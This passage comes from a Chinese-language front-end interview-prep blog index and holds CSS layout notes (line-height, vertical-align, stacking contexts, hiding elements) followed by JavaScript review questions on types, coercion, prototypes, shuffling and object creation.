（8）如果使用数值作为line-height的属性值，那么所有的子元素继承的都是这个值；但是，如果使用百分比值或者长度值作为属性值，那么所有的子元素继承的是最终的计算值。 （9）无论内联元素line-height如何设置，最终父级元素的高度都是由数值大的那个line-height决定的。 （10）只要有“内联盒子”在，就一定会有“行框盒子”，就是每一行内联元素外面包裹的一层看不见的盒子。然后，重点来了，在每个“行框盒子”前面有一个宽度为0的具有该元素的字体和行高属性的看不见的“幽灵空白节点”。 81.vertical-align 的特殊性？ （1）vertical-align的默认值是baseline，即基线对齐，而基线的定义是字母x的下边缘。因此，内联元素默认都是沿着字母x的下边缘对齐的。对于图片等替换元素，往往使用元素本身的下边缘作为基线。：一个inline-block元素，如果里面没有内联元素，或者overflow不是visible，则该元素的基线就是其margin底边缘；否则其基线就是元素里面最后一行内联元素的基线。 （2）vertical-align:top就是垂直上边缘对齐，如果是内联元素，则和这一行位置最高的内联元素的顶部对齐；如果display计算值是table-cell的元素，我们不妨脑补成元素，则和元素上边缘对齐。 （3）vertical-align:middle是中间对齐，对于内联元素，元素的垂直中心点和行框盒子基线往上1/2x-height处对齐。对于table-cell元素，单元格填充盒子相对于外面的表格行居中对齐。 （4）vertical-align支持数值属性，根据数值的不同，相对于基线往上或往下偏移，如果是负值，往下偏移，如果是正值，往上偏移。 （5）vertical-align属性的百分比值则是相对于line-height的计算值计算的。 （6）vertical-align起作用是有前提条件的，这个前提条件就是：只能应用于内联元素以及display值为table-cell的元素。 （7）table-cell元素设置vertical-align垂直对齐的是子元素，但是其作用的并不是子元素，而是table-cell元素自身。 82.overflow 的特殊性？ （1）一个设置了overflow:hidden声明的元素，假设同时存在border属性和padding属性，则当子元素内容超出容器宽度高度限制的时候，剪裁的边界是borderbox的内边缘，而非paddingbox的内边缘。 （2）HTML中有两个标签是默认可以产生滚动条的，一个是根元素，另一个是文本域。 （3）滚动条会占用容器的可用宽度或高度。 （4）元素设置了overflow:hidden声明，里面内容高度溢出的时候，滚动依然存在，仅仅滚动条不存在！ 83.无依赖绝对定位是什么？ 没有设置left/top/right/bottom属性值的绝对定位称为“无依赖绝对定位”。 无依赖绝对定位其定位的位置和没有设置position:absolute时候的位置相关。 84.absolute 与 overflow 的关系？ （1）如果overflow不是定位元素，同时绝对定位元素和overflow容器之间也没有定位元素，则overflow无法对absolute元素进行剪裁。 （2）如果overflow的属性值不是hidden而是auto或者scroll，即使绝对定位元素高宽比overflow元素高宽还要大，也都不会出现滚动条。 （3）overflow元素自身transform的时候，Chrome和Opera浏览器下的overflow剪裁是无效的。 85.clip 裁剪是什么？ 所谓“可访问性隐藏”，指的是虽然内容肉眼看不见，但是其他辅助设备却能够进行识别和访问的隐藏。 clip剪裁被我称为“最佳可访问性隐藏”的另外一个原因就是，它具有更强的普遍适应性，任何元素、任何场景都可以无障碍使用。 86.relative 的特殊性？ （1）相对定位元素的left/top/right/bottom的百分比值是相对于包含块计算的，而不是自身。注意，虽然定位位移是相对自身，但是百分比值的计算值不是。 （2）top和bottom这两个垂直方向的百分比值计算跟height的百分比值是一样的，都是相对高度计算的。同时，如果包含块的高度是auto，那么计算值是0，偏移无效，也就是说，如果父元素没有设定高度或者不是“格式化高度”，那么relative类似top:20%的代码等同于top:0。 （3）当相对定位元素同时应用对立方向定位值的时候，也就是top/bottom和left/right同时使用的时候，只有一个方向的定位属性会起作用。而谁起作用则是与文档流的顺序有关的，默认的文档流是自上而下、从左往右，因此top/bottom同时使用的时候，bottom失效；left/right同时使用的时候，right失效。 87.什么是层叠上下文？ 层叠上下文，英文称作stackingcontext，是HTML中的一个三维的概念。如果一个元素含有层叠上下文，我们可以理解为这个元素在z轴上就“高人一等”。 层叠上下文元素有如下特性： （1）层叠上下文的层叠水平要比普通元素高（原因后面会说明）。（2）层叠上下文可以阻断元素的混合模式。（3）层叠上下文可以嵌套，内部层叠上下文及其所有子元素均受制于外部的“层叠上下文”。（4）每个层叠上下文和兄弟元素独立，也就是说，当进行层叠变化或渲染的时候，只需要考虑后代元素。（5）每个层叠上下文是自成体系的，当元素发生层叠的时候，整个元素被认为是在父层叠上下文的层叠顺序中。 层叠上下文的创建： （1）页面根元素天生具有层叠上下文，称为根层叠上下文。根层叠上下文指的是页面根元素，可以看成是&lt;html&gt;元素。因此，页面中所有的元素一定处于至少一个“层叠结界”中。 （2）对于position值为relative/absolute以及Firefox/IE浏览器（不包括Chrome浏览器）下含有position:fixed声明的定位元素，当其z-index值不是auto的时候，会创建层叠上下文。Chrome等WebKit内核浏览器下，position:fixed元素天然层叠上下文元素，无须z-index为数值。根据我的测试，目前IE和Firefox仍是老套路。 （3）其他一些CSS3属性，比如元素的opacity值不是1。 88.什么是层叠水平？ 层叠水平，英文称作stackinglevel，决定了同一个层叠上下文中元素在z轴上的显示顺序。 显而易见，所有的元素都有层叠水平，包括层叠上下文元素，也包括普通元素。然而，对普通元素的层叠水平探讨只局限在当前层叠上下文元素中。 89.元素的层叠顺序？ 层叠顺序，英文称作 stackingorder，表示元素发生层叠时有着特定的垂直显示顺序。 90.层叠准则？ （1）谁大谁上：当具有明显的层叠水平标识的时候，如生效的z-index属性值，在同一个层叠上下文领域，层叠水平值大的那一个覆盖小的那一个。 （2）后来居上：当元素的层叠水平一致、层叠顺序相同的时候，在DOM流中处于后面的元素会覆盖前面的元素。 91.font-weight 的特殊性？ 如果使用数值作为font-weight属性值，必须是100～900的整百数。因为这里的数值仅仅是外表长得像数值，实际上是一个具有特定含义的关键字，并且这里的数值关键字和字母关键字之间是有对应关系的。 92.text-indent 的特殊性？ （1）text-indent仅对第一行内联盒子内容有效。 （2）非替换元素以外的display计算值为inline的内联元素设置text-indent值无效，如果计算值inline-block/inline-table则会生效。 （3）&lt;input&gt;标签按钮text-indent值无效。 （4）&lt;button&gt;标签按钮text-indent值有效。 （5）text-indent的百分比值是相对于当前元素的“包含块”计算的，而不是当前元素。 93.letter-spacing 与字符间距 letter-spacing可以用来控制字符之间的间距，这里说的“字符”包括英文字母、汉字以及空格等。 letter-spacing具有以下一些特性。 （1）继承性。（2）默认值是normal而不是0。虽然说正常情况下，normal的计算值就是0，但两者还是有差别的，在有些场景下，letter-spacing会调整normal的计算值以实现更好的版面布局。（3）支持负值，且值足够大的时候，会让字符形成重叠，甚至反向排列。（4）和text-indent属性一样，无论值多大或多小，第一行一定会保留至少一个字符。（5）支持小数值，即使0.1px也是支持的。（6）暂不支持百分比值。 94.word-spacing 与单词间距？ letter-spacing作用于所有字符，但word-spacing仅作用于空格字符。换句话说，word-spacing的作用就是增加空格的间隙宽度。 95.white-space 与换行和空格的控制？white-space属性声明了如何处理元素内的空白字符，这类空白字符包括Space（空格）键、Enter（回车）键、Tab（制表符）键产生的空白。因此，white-space可以决定图文内容是否在一行显示（回车空格是否生效），是否显示大段连续空白（空格是否生效）等。 其属性值包括下面这些。 •normal：合并空白字符和换行符。•pre：空白字符不合并，并且内容只在有换行符的地方换行。•nowrap：该值和normal一样会合并空白字符，但不允许文本环绕。•pre-wrap：空白字符不合并，并且内容只在有换行符的地方换行，同时允许文本环绕。•pre-line：合并空白字符，但只在有换行符的地方换行，允许文本环绕。 96.隐藏元素的 background-image 到底加不加载？-（1）元素的背景图片 元素本身设置 display:none，会请求图片父级元素设置 display:none，不会请求图片样式没有元素使用，不会请求:hover 样式下，触发时请求 -（2）img 标签图片任何情况下都会请求图片 97.如何实现单行／多行文本溢出的省略（…）？1234567891011121314151617181920212223/*单行文本溢出*/p &#123; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;&#125;/*多行文本溢出*/p &#123; position: relative; line-height: 1.5em; /*高度为需要显示的行数*行高，比如这里我们显示两行，则为3*/ height: 3em; overflow: hidden;&#125;p:after &#123; content: \"...\"; position: absolute; bottom: 0; right: 0; background-color: #fff;&#125; 98.常见的元素隐藏方式？-（1）使用 display:none;隐藏元素，渲染树不会包含该渲染对象，因此该元素不会在页面中占据位置，也不会响应绑定的监听事件。 -（2）使用 visibility:hidden;隐藏元素。元素在页面中仍占据空间，但是不会响应绑定的监听事件。 -（3）使用 opacity:0;将元素的透明度设置为 0，以此来实现元素的隐藏。元素在页面中仍然占据空间，并且能够响应元素绑定的监听事件。 -（4）通过使用绝对定位将元素移除可视区域内，以此来实现元素的隐藏。 -（5）通过 z-index 负值，来使其他元素遮盖住该元素，以此来实现隐藏。 -（6）通过 clip/clip-path 元素裁剪的方法来实现元素的隐藏，这种方法下，元素仍在页面中占据位置，但是不会响应绑定的监听事件。 -（7）通过 transform:scale(0,0)来将元素缩放为 0，以此来实现元素的隐藏。这种方法下，元素仍在页面中占据位置，但是不会响应绑定的监听事件。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"面经笔经","slug":"技术/前端/面经笔经","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/%E9%9D%A2%E7%BB%8F%E7%AC%94%E7%BB%8F/"}],"tags":[]},{"title":"javascript复习汇总","slug":"javascript复习汇总","date":"2020-03-15T16:00:00.000Z","updated":"2024-05-27T05:12:37.172Z","comments":true,"path":"2020/03/16/javascript复习汇总/","link":"","permalink":"https://wtaufpziv.github.io/2020/03/16/javascript%E5%A4%8D%E4%B9%A0%E6%B1%87%E6%80%BB/","excerpt":"JavaScript 面试知识点总结本文搬运自CavsZhouyou的github 1. 介绍 js 的基本数据类型。 js 一共有六种基本数据类型，分别是 Undefined、Null、Boolean、Number、String，还有在 ES6 中新增的 Symbol 类型，代表创建后独一无二且不可变的数据类型，它的出现我认为主要是为了解决可能出现的全局变量冲突的问题。","text":"JavaScript 面试知识点总结本文搬运自CavsZhouyou的github 1. 介绍 js 的基本数据类型。 js 一共有六种基本数据类型，分别是 Undefined、Null、Boolean、Number、String，还有在 ES6 中新增的 Symbol 类型，代表创建后独一无二且不可变的数据类型，它的出现我认为主要是为了解决可能出现的全局变量冲突的问题。 2. JavaScript 有几种类型的值？你能画一下他们的内存图吗？js 可以分为两种类型的值，一种是基本数据类型，一种是复杂数据类型。 复杂数据类型指的是 Object 类型，所有其他的如 Array、Date 等数据类型都可以理解为 Object 类型的子类。 两种类型间的主要区别是它们的存储位置不同，基本数据类型的值直接保存在栈中，而复杂数据类型的值保存在堆中，通过使用在栈中,保存对应的指针来获取堆中的值。 详细资料可以参考：《JavaScript 有几种类型的值？》《JavaScript 有几种类型的值？能否画一下它们的内存图；》 3. 什么是堆？什么是栈？它们之间有什么区别和联系？堆和栈的概念存在于数据结构中和操作系统内存中。 在数据结构中，栈中数据的存取方式为先进后出。而堆是一个优先队列，是按优先级来进行排序的，优先级可以按照大小来规定。完全二叉树是堆的一种实现方式。 在操作系统中，内存被分为栈区和堆区。 栈区内存由编译器自动分配释放，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。 堆区内存一般由程序员分配释放，若程序员不释放，程序结束时可能由垃圾回收机制回收。 详细资料可以参考： 《什么是堆？什么是栈？他们之间有什么区别和联系？》 4. 内部属性 [[Class]] 是什么？ 所有 typeof 返回值为 “object” 的对象（如数组）都包含一个内部属性 [[Class]]（我们可以把它看作一个内部的分类，而非传统的面向对象意义上的类）。这个属性无法直接访问，一般通过 Object.prototype.toString(..) 来查看。例如： 12345Object.prototype.toString.call( [1,2,3] );// \"[object Array]\"Object.prototype.toString.call( /regex-literal/i );// \"[object RegExp]\" 5. 介绍 js 有哪些内置对象？标准内置对象的分类 （1）值属性，这些全局属性返回一个简单值，这些值没有自己的属性和方法。 例如 Infinity、NaN、undefined、null 字面量 （2）函数属性，全局函数可以直接调用，不需要在调用时指定所属对象，执行结束后会将结果直接返回给调用者。 例如 eval()、parseFloat()、parseInt() 等 （3）基本对象，基本对象是定义或使用其他对象的基础。基本对象包括一般对象、函数对象和错误对象。 例如 Object、Function、Boolean、Symbol、Error 等 （4）数字和日期对象，用来表示数字、日期和执行数学计算的对象。 例如 Number、Math、Date （5）字符串，用来表示和操作字符串的对象。 例如 String、RegExp （6）可索引的集合对象，这些对象表示按照索引值来排序的数据集合，包括数组和类型数组，以及类数组结构的对象。例如 Array （7）使用键的集合对象，这些集合对象在存储数据时会使用到键，支持按照插入顺序来迭代元素。 例如 Map、Set、WeakMap、WeakSet （8）矢量集合，SIMD 矢量集合中的数据会被组织为一个数据序列。 例如 SIMD 等 （9）结构化数据，这些对象用来表示和操作结构化的缓冲区数据，或使用 JSON 编码的数据。 例如 JSON 等 （10）控制抽象对象 例如 Promise、Generator 等 （11）反射 例如 Reflect、Proxy （12）国际化，为了支持多语言处理而加入 ECMAScript 的对象。 例如 Intl、Intl.Collator 等 （13）WebAssembly （14）其他 例如 arguments 回答： js 中的内置对象主要指的是在程序执行前存在全局作用域里的由 js 定义的一些全局值属性、函数和用来实例化其他对象的构造函数对象。一般我们经常用到的如全局变量值 NaN、undefined，全局函数如 parseInt()、parseFloat() 用来实例化对象的构造函数如 Date、Object 等，还有提供数学计算的单体内置对象如 Math 对象。 6. undefined 与 undeclared 的区别？ 已在作用域中声明但还没有赋值的变量，是 undefined 的。相反，还没有在作用域中声明过的变量，是 undeclared 的。 对于 undeclared 变量的引用，浏览器会报引用错误，如 ReferenceError: b is not defined 。但是我们可以使用 typeof 的安全防范机制来避免报错，因为对于 undeclared（或者 not defined ）变量，typeof 会返回 “undefined”。 7. null 和 undefined 的区别？ 首先 Undefined 和 Null 都是基本数据类型，这两个基本数据类型分别都只有一个值，就是 undefined 和 null。 undefined 代表的含义是未定义，null 代表的含义是空对象。一般变量声明了但还没有定义的时候会返回 undefined，null主要用于赋值给一些可能会返回对象的变量，作为初始化。 undefined 在 js 中不是一个保留字，这意味着我们可以使用 undefined 来作为一个变量名，这样的做法是非常危险的，一旦undefine被重写，我们之后对于undefine的访问都会产生问题。但是我们可以通过一些方法获得安全的 undefined 值，： void 0 当我们对两种类型使用 typeof 进行判断的时候，Null 类型化会返回 “object”，这是一个历史遗留的问题。当我们使用双等号对两种类型的值进行比较时会返回 true，使用三个等号时会返回 false。 详细资料可以参考：《JavaScript 深入理解之 undefined 与 null》 8. 如何获取安全的 undefined 值？ 因为 undefined 是一个标识符，所以可以被当作变量来使用和赋值，但是这样会影响 undefined 的正常判断。 表达式 void ___ 没有返回值，因此返回结果是 undefined。void 并不改变表达式的结果，只是让表达式不返回值。 按惯例我们用 void 0 来获得 undefined。 9. 说几条写 JavaScript 的基本规范？在平常项目开发中，我们遵守一些这样的基本规范，比如说： （1）一个函数作用域中所有的变量声明应该尽量提到函数首部，用一个 var 声明，不允许出现两个连续的 var 声明，声明时如果变量没有值，应该给该变量赋值对应类型的初始值，便于他人阅读代码时，能够一目了然的知道变量对应的类型值。（2）代码中出现地址、时间等字符串时需要使用常量代替。（3）在进行比较的时候吧，尽量使用&#39;===&#39;,&#39;!==&#39;代替&#39;==&#39;,&#39;!=&#39;。（4）不要在内置对象的原型上添加方法，如 Array, Date。（5）switch 语句必须带有 default 分支。（6）for 循环必须使用大括号。（7）if 语句必须使用大括号。 10. JavaScript 原型，原型链？ 有什么特点？ 在 js 中我们是使用构造函数来新建一个对象的，每一个构造函数的内部都有一个 prototype 属性值，这个属性值是一个对象，这个对象包含了可以由该构造函数的所有实例共享的属性和方法。当我们使用构造函数新建一个对象后，在这个对象的内部将包含一个指针，这个指针指向构造函数的 prototype 属性对应的值，这个指针被称为对象的原型。一般来说我们是不应该能够获取到这个值的，但是现在浏览器中都实现了 proto 属性来让我们访问这个属性，但是我们最好不要使用这个属性，因为它不是规范中规定的。ES5 中新增了一个 Object.getPrototypeOf() 方法，我们可以通过这个方法来获取对象的原型。 当我们访问一个对象的属性时，如果这个对象内部不存在这个属性，那么它就会去它的原型对象里找这个属性，这个原型对象又会有自己的原型，于是就这样一直找下去，也就是原型链的概念。原型链的尽头一般来说都是 Object.prototype 所以这就是我们新建的对象为什么能够使用 toString() 等方法的原因。 特点： JavaScript 对象是通过引用来传递的，我们创建的每个新对象实体中并没有一份属于自己的原型副本。当我们修改原型时，与之相关的对象也会继承这一改变。 详细资料可以参考： 《JavaScript 深入理解之原型与原型链》 11. js 获取原型的方法？ （1）p.__proto__（2）p.constructor.prototype（3）Object.getPrototypeOf(p) 12. 在 js 中不同进制数字的表示方式 （1）以 0X、0x 开头的表示为十六进制。 （2）以 0、0O、0o 开头的表示为八进制。 （3）以 0B、0b 开头的表示为二进制格式。 13. js 中整数的安全范围是多少？安全呈现的整数： 能够被“安全”呈现的最大整数是 9007199254740991, 也就是2^53 - 1，在 ES6 中被定义为Number.MAX_SAFE_INTEGER。最小整数是-9007199254740991，在 ES6 中被定义为 Number.MIN_SAFE_INTEGER。 JS数值范围： 注意区分安全呈现和数值范围，ES5中JS数值范围用Number.MAX_VALUE ~ Number.MINVALUE表示 如果某次计算的结果得到了一个超过 JavaScript 数值范围的值，那么这个值会被自动转换为特殊的 Infinity 值。如果某次计算返回了正或负的 Infinity 值，那么该值将无法参与下一次的计算。判断一个数是不是有穷的，可以使用 isFinite 函数来判断。 14. typeof NaN 的结果是什么？ NaN 意指“不是一个数字”（not a number），用于指出数字类型中的错误情况，即“执行数学运算没有成功，这是失败后返回的结果”。 typeof NaN; // “number” NaN 是一个特殊值，它和自身不相等，是唯一一个非自反（自反，reflexive，即 x === x 不成立）的值。而 NaN != NaN为 true。 15. isNaN 和 Number.isNaN 函数的区别？ 函数 isNaN 接收参数后，会尝试将这个参数转换为数值，任何不能被转换为数值的的值都会返回 true，因此非数字值传入也会返回 true ，会影响 NaN 的判断。 函数 Number.isNaN 会首先判断传入参数是否为数字，如果是数字再继续判断是否为 NaN ，这种方法对于 NaN 的判断更为准确。 16. Array 构造函数只有一个参数值时的表现？ Array 构造函数只带一个数字参数的时候，该参数会被作为数组的预设长度（length），而非只充当数组中的一个元素。这样创建出来的只是一个空数组，只不过它的 length 属性被设置成了指定的值。 构造函数 Array(..) 不要求必须带 new 关键字。不带时，它会被自动补上。 17. 其他值到字符串的转换规则？规范的 9.8 节中定义了抽象操作 ToString ，它负责处理非字符串到字符串的强制类型转换。 （1）Null 和 Undefined 类型 ，null 转换为 “null”，undefined 转换为 “undefined”，（2）Boolean 类型，true 转换为 “true”，false 转换为 “false”。（3）Number 类型的值直接转换，不过那些极小和极大的数字会使用指数形式。（4）Symbol 类型的值直接转换，但是只允许显式强制类型转换，使用隐式强制类型转换会产生错误。（3）对普通对象来说，除非自行定义 toString() 方法，否则会调用 toString()（Object.prototype.toString()）来返回内部属性 [[Class]]的值，如”[object Object]”。如果对象有自己的 toString() 方法，字符串化时就会调用该方法并使用其返回值。 18. 其他值到数字值的转换规则？ 有时我们需要将非数字值当作数字来使用，比如数学运算。为此 ES5 规范在 9.3 节定义了抽象操作 ToNumber。 （1）Undefined 类型的值转换为 NaN。（2）Null 类型的值转换为 0。（3）Boolean 类型的值，true 转换为 1，false 转换为 0。（4）String 类型的值转换如同使用 Number() 函数进行转换，如果包含非数字值则转换为 NaN，空字符串为 0。（5）Symbol 类型的值不能转换为数字，会报错。（6）对象（包括数组）会首先被转换为相应的基本类型值，如果返回的是非数字的基本类型值，则再遵循以上规则将其强制转换为数字为了将值转换为相应的基本类型值，抽象操作 ToPrimitive 会首先（通过内部操作 DefaultValue）检查该值是否有valueOf() 方法。如果有并且返回基本类型值，就使用该值进行强制类型转换。如果没有就使用 toString() 的返回值（如果存在）来进行强制类型转换。 如果 valueOf() 和 toString() 均不返回基本类型值，会产生 TypeError 错误。 19. 其他值到布尔类型的值的转换规则？ES5 规范 9.2 节中定义了抽象操作 ToBoolean，列举了布尔强制类型转换所有可能出现的结果。 以下这些是假值：• undefined• null• false• +0、-0 和 NaN• “” 假值的布尔强制类型转换结果为 false。从逻辑上说，假值列表以外的都应该是真值。 20. {} 和 [] 的 valueOf 和 toString 的结果是什么？ {} 的 valueOf 结果为 {} ，toString 的结果为 “[object Object]” [] 的 valueOf 结果为 [] ，toString 的结果为 “” 21. 什么是假值对象？ 浏览器在某些特定情况下，在常规 JavaScript 语法基础上自己创建了一些外来值，这些就是“假值对象”。假值对象看起来和普通对象并无二致（都有属性，等等），但将它们强制类型转换为布尔值时结果为 false 最常见的例子是 document.all，它是一个类数组对象，包含了页面上的所有元素，由 DOM（而不是 JavaScript 引擎）提供给 JavaScript 程序使用。 22. ~ 操作符的作用？ ~ 返回 2 的补码，并且 ~ 会将数字转换为 32 位整数，因此我们可以使用 ~ 来进行取整操作。 ~x 大致等同于 -(x+1)。 23. 解析字符串中的数字和将字符串强制类型转换为数字的返回结果都是数字，它们之间的区别是什么？ 解析允许字符串（如 parseInt() ）中含有非数字字符，解析按从左到右的顺序，如果遇到非数字字符就停止。 而转换（如 Number ()）不允许出现非数字字符，否则会失败并返回 NaN。 24. + 操作符什么时候用于字符串的拼接？ 简单来说就是，如果 + 的其中一个操作数是字符串（或者通过以上步骤最终得到字符串），则执行字符串拼接，否则执行数字 加法。 那么对于除了加法的运算符来说，只要其中一方是数字，那么另一方就会被转为数字。 25. 什么情况下会发生布尔值的隐式强制类型转换？ （1） if (..) 语句中的条件判断表达式。（2） for ( .. ; .. ; .. ) 语句中的条件判断表达式（第二个）。（3） while (..) 和 do..while(..) 循环中的条件判断表达式。（4） ? : 中的条件判断表达式。（5） 逻辑运算符 ||（逻辑或）和 &amp;&amp;（逻辑与）左边的操作数（作为条件判断表达式）。 26. || 和 &amp;&amp; 操作符的返回值？ || 和 &amp;&amp; 首先会对第一个操作数执行条件判断，如果其不是布尔值就先进行 ToBoolean 强制类型转换，然后再执行条件判断。 对于 || 来说，如果条件判断结果为 true 就返回第一个操作数的值，如果为 false 就返回第二个操作数的值。 &amp;&amp; 则相反，如果条件判断结果为 true 就返回第二个操作数的值，如果为 false 就返回第一个操作数的值。 || 和 &amp;&amp; 返回它们其中一个操作数的值，而非条件判断的结果 27. Symbol 值的强制类型转换？ 1234ES6 允许从符号到字符串的显式强制类型转换，然而隐式强制类型转换会产生错误。Symbol 值不能够被强制类型转换为数字（显式和隐式都会产生错误），但可以被强制类型转换为布尔值（显式和隐式结果都是 true ）。 28. == 操作符的强制类型转换规则？ （1）字符串和数字之间的相等比较，将字符串转换为数字之后再进行比较。 （2）其他类型和布尔类型之间的相等比较，先将布尔值转换为数字后，再应用其他规则进行比较。 （3）null 和 undefined 之间的相等比较，结果为真。其他值和它们进行比较都返回假值。 （4）对象和非对象之间的相等比较，对象先调用 ToPrimitive 抽象操作后，再进行比较。 （5）如果一个操作值为 NaN ，则相等比较返回 false（ NaN 本身也不等于 NaN ）。 （6）如果两个操作值都是对象，则比较它们是不是指向同一个对象。如果两个操作数都指向同一个对象，则相等操作符返回true，否则，返回 false。 29. 如何将字符串转化为数字，例如 ‘12.3b’? （1）使用 Number() 方法，前提是所包含的字符串不包含不合法字符。 （2）使用 parseInt() 方法，parseInt() 函数可解析一个字符串，并返回一个整数。还可以设置要解析的数字的基数。当基数的值为 0，或没有设置该参数时，parseInt() 会根据 string 来判断数字的基数。 （3）使用 parseFloat() 方法，该函数解析一个字符串参数并返回一个浮点数。 （4）使用 + 操作符的隐式转换。 30. 如何将浮点数点左边的数每三位添加一个逗号，如12000000.11转化为『12,000,000.11』?123function format(number)&#123; return number &amp;&amp; number.replace(/(?!^)(?=(\\d&#123;3&#125;)+\\.)/g,\",\")&#125; 31. 常用正则表达式1234567891011121314（1）匹配 16 进制颜色值 var regex = /#([0-9a-fA-F]&#123;6&#125;|[0-9a-fA-F]&#123;3&#125;)/g;（2）匹配日期，如 yyyy-mm-dd 格式 var regex = /^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|[12][0-9]|3[01])$/;（3）匹配 qq 号 var regex = /^[1-9][0-9]&#123;4,10&#125;$/g;（4）手机号码正则 var regex = /^1[34578]\\d&#123;9&#125;$/g;（5）用户名正则 var regex = /^[a-zA-Z\\$][a-zA-Z0-9_\\$]&#123;4,16&#125;$/; 详细资料可以参考： 《前端表单验证常用的15个 JS 正则表达式》 《JS 常用正则汇总》 32. 生成随机数的各种方法？ 《JS - 生成随机数的方法汇总（不同范围、类型的随机数）》 33. 如何实现数组的随机排序？123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657（1）使用数组 sort 方法对数组元素随机排序，让 Math.random() 出来的数与 0.5 比较，如果大于就返回 1 交换位 置，如果小于就返回 -1，不交换位置。 function randomSort(a, b) &#123; return Math.random() &gt; 0.5 ? -1 : 1; &#125; 缺点：每个元素被派到新数组的位置不是随机的，原因是 sort() 方法是依次比较的。（2）随机从原数组抽取一个元素，加入到新数组 function randomSort(arr) &#123; var result = []; while (arr.length &gt; 0) &#123; var randomIndex = Math.floor(Math.random() * arr.length); result.push(arr[randomIndex]); arr.splice(randomIndex, 1); &#125; return result; &#125;（3）随机交换数组内的元素（洗牌算法类似） function randomSort(arr) &#123; var index, randomIndex, temp, len = arr.length; for (index = 0; index &lt; len; index++) &#123; randomIndex = Math.floor(Math.random() * (len - index)) + index; temp = arr[index]; arr[index] = arr[randomIndex]; arr[randomIndex] = temp; &#125; return arr; &#125; // es6 function randomSort(array) &#123; let length = array.length; if (!Array.isArray(array) || length &lt;= 1) return; for (let index = 0; index &lt; length - 1; index++) &#123; let randomIndex = Math.floor(Math.random() * (length - index)) + index; [array[index], array[randomIndex]] = [array[randomIndex], array[index]]; &#125; return array; &#125; 详细资料可以参考： 《Fisher and Yates 的原始版》 《javascript 实现数组随机排序?》 《JavaScript 学习笔记：数组随机排序》 34. javascript 创建对象的几种方式？ 我们一般使用字面量的形式直接创建对象，但是这种创建方式对于创建大量相似对象的时候，会产生大量的重复代码。但 js和一般的面向对象的语言不同，在 ES6 之前它没有类的概念。但是我们可以使用函数来进行模拟，从而产生出可复用的对象。创建方式，我了解到的方式有这么几种： （1）第一种是工厂模式，工厂模式的主要工作原理是用函数来封装创建对象的细节，从而通过调用函数来达到复用的目的。但是它有一个很大的问题就是创建出来的对象无法和某个类型联系起来，它只是简单的封装了复用代码，而没有建立起对象和类型间的关系。 （2）第二种是构造函数模式。js 中每一个函数都可以作为构造函数，只要一个函数是通过 new 来调用的，那么我们就可以把它称为构造函数。执行构造函数首先会创建一个对象，然后将对象的原型指向构造函数的 prototype 属性，然后将执行上下文中的 this 指向这个对象，返回新建的对象。构造函数模式相对于工厂模式的优点是，所创建的对象和构造函数建立起了联系，因此我们可以通过原型来识别对象的类型。但是构造函数存在一个缺点就是，不同对象上的同一方法函数分别是不同的副本，造成了内存上的浪费。 （3）第三种模式是原型模式，因为每一个函数都有一个 prototype 属性，这个属性是一个对象，它包含了通过构造函数创建的所有实例都能共享的属性和方法。因此我们可以使用原型对象来添加公用属性和方法，从而实现代码的复用。这种方式相对于构造函数模式来说，解决了函数对象的复用问题。但是这种模式也存在一些问题，一个是没有办法通过传入参数来初始化值，另一个是如果存在一个引用类型如 Array 这样的值，那么所有的实例将共享一个对象，一个实例对引用类型值的改变会影响所有的实例。 注意：原型模式理论上不止引用类型，所有类型都会存在只要更改了原型，所有实例都会随着更改的问题，如下代码123456789function a()&#123;&#125;a.prototype.name = 'zxh'a.prototype.arr = [1, 2, 3]let b = new a()let c = new a()b._proto__.name = 'xxh'console.log(b.name)console.log(c.name)但是！！！一般来说我们更改实例的属性并不会直接去修改原型属性（严格来讲也不允许，所以尽量不要写出上面这样的代码。 回顾上面所讲的，一般不要给内置对象的原型对象私自添加方法） 这样写才是正确的 123456789function a()&#123;&#125;a.prototype.name = 'zxh'a.prototype.arr = [1, 2, 3]let b = new a()let c = new a()b.name = 'xxh'console.log(b.name)console.log(c.name) 可以看到，由于b.name = &#39;xxh&#39;实际上是给实例b添加了属性name，而a继续引用原型上的值，所以两者并不会相互影响 原型模式的缺点真正体现在下面这段代码 123456789function a()&#123;&#125;a.prototype.name = 'zxh'a.prototype.arr = [1, 2, 3]let b = new a()let c = new a()b.arr.push(4)console.log(b.arr)console.log(c.arr) （4）第四种模式是组合使用构造函数模式和原型模式，这是创建自定义类型的最常见方式。因为构造函数模式和原型模式分开使用都存在一些问题，因此我们可以组合使用这两种模式，通过构造函数来初始化对象的属性，通过原型对象来实现函数方法的复用。这种方法很好的解决了两种模式单独使用时的缺点，但是有一点不足的就是，因为使用了两种不同的模式，所以对于代码的封装性不够好。 （5）第五种模式是动态原型模式，这一种模式将原型方法赋值的创建过程移动到了构造函数的内部，通过对属性是否存在的判断，可以实现仅在第一次调用函数时对原型对象赋值一次的效果。这一种方式很好地对上面的混合模式进行了封装。 （6）第六种模式是寄生构造函数模式，这一种模式和工厂模式的实现基本相同，我对这个模式的理解是，它主要是基于一个已有的类型，在实例化时对实例化的对象进行扩展。这样既不用修改原来的构造函数，也达到了扩展对象的目的。它的一个缺点和工厂模式一样，无法实现对象的识别。 详细资料可以参考： 《JavaScript 深入理解之对象创建》 35. JavaScript 继承的几种实现方式？我了解的 js 中实现继承的几种方式有： （1）第一种是以原型链的方式来实现继承，但是这种实现方式存在的缺点是，在包含有引用类型的数据时，会被所有的实例对象所共享，容易造成修改的混乱。还有就是在创建子类型的时候不能向超类型传递参数。 （2）第二种方式是使用借用构造函数的方式，这种方式是通过在子类型的函数中调用超类型的构造函数来实现的，这一种方法解决了不能向超类型传递参数的缺点，但是它存在的一个问题就是无法实现函数方法的复用，并且超类型原型定义的方法子类型也没有办法访问到。 